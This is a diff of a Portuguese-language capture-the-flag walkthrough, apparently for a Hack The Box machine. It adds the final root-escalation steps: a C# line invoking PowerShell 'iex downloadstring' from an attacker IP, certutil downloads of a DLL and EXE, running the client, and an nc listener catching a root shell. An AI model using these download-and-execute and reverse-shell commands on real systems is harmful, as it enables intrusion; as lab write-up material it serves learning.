@@ -216,19 +216,29 @@ Ao baixar o arquivo para nossa máquina, podemos abri-lo no VisualStudio:
 Vamos adicionar nossa linha no código e depois compilar.
 ![Image](https://i.imgur.com/MBxWpho.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.146/chu.ps1')"));
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-certutil -urlcache -split -f "http://10.10.14.136/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
-certutil -urlcache -split -f "http://10.10.14.136/WcfClient.exe" WcfClient.exe
+Console.WriteLine(client.InvokePowerShell(" iex (new-object net.webclient).downloadstring('http://10.10.14.219/chu.ps1')"));
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo escrevendo 
+Transferimos os arquivos para a máquina(poderiamos ter usado o Invoke-WebRequest):
 
+![Image](https://i.imgur.com/zLgjJS9.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+certutil -urlcache -split -f "http://10.10.14.219/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll
+certutil -urlcache -split -f "http://10.10.14.219/WcfClient.exe" WcfClient.exe
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Após isso, executamos nosso arquivo:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+.\WcfClient.exe
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Com isso, recebemos a conexão como r00t~
+
+![Image](https://i.imgur.com/HMjn5Uw.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvnlp 1337
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
 if i helped you, add + respect at my profile :D
